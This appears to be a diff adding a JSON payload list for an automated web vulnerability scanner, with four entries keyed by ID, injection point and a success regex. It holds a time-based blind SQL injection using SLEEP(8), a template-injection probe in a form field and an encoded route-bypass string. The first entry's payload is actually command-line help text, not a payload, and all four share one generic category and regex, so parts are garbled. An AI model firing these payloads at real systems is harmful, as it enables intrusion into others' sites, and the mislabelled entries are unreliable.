@@ -1,0 +1,46 @@
+[
+  {
+    "payload_id": "OWP-215156",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[--wait-time WAIT_TIME] [--waf-bypass] [--dns-callback-provider DNS_CALLBACK_PROVIDER] [--custom-dns-callback-host CUSTOM_DNS_CALLBACK_HOST]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-403340",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "MySQL",
+    "injection_point": "body_json",
+    "payload_string": "{{path}}?ordering_by=post_title%20DESC%2C(SELECT%209143%20FROM%20(SELECT(SLEEP(8)))cFAm)--%20",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-404455",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{{pagepath}}cfsPreFill=1&first_name=%7B%7B{{num1}}*{{num2}}%7D%7D",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-404529",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{{survey_path}}?s={{survey_hash}}&__passthru=%2569ndex.php&route=ParcelController%3Ashow",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  }
+]
